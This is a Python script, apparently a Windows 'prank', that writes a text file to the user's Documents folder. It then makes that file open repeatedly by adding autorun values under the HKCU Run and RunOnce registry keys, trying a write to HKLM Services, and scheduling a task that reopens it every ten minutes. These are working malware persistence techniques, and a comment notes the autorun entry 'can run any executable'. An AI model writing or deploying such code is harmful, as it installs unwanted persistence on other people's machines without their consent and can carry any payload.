import os
import winreg as reg
import subprocess

# create_file
def create_file():
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    file_path = os.path.join(documents_path, "prank.txt")
    with open(file_path, "w") as file:
        file.write("You've been pranked")
    print(file_path)


# create_registry_autorun
def add_to_startup():
    hkcu_keys = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
    hklm_keys = [r"SYSTEM\CurrentControlSet\Services"]
    value_name = "GetPranked"
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    text_file_path = os.path.join(documents_path, "prank.txt")
    file_path = r"notepad.exe " + text_file_path  # Opens a file with Notepad - can run any executable (I think)
    
    for key in hkcu_keys:
        try:
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
                reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, file_path)
        except PermissionError:
            print("failed", key)
            pass
    for key in hklm_keys:
        try:
            with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_SET_VALUE) as reg_key:
                reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, file_path)
        except PermissionError:
            print("failed", key)
            pass



# schedule_task
def schedule_task():
    task_name = "OpenPrankFile"
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    file_path = os.path.join(documents_path, "prank.txt")
    interval = "MINUTE"
    repeat_interval = "10"

    command = [
        "schtasks", "/create", "/tn", task_name,
        "/tr", f'notepad.exe "{file_path}"',
        "/sc", interval, "/mo", repeat_interval,
        "/f"  # Force update if task already exists
    ]

    try:
        subprocess.run(command, check=True, shell=True)
    except subprocess.CalledProcessError as e:
        pass

if __name__ == "__main__":
    create_file()
    add_to_startup()
    schedule_task()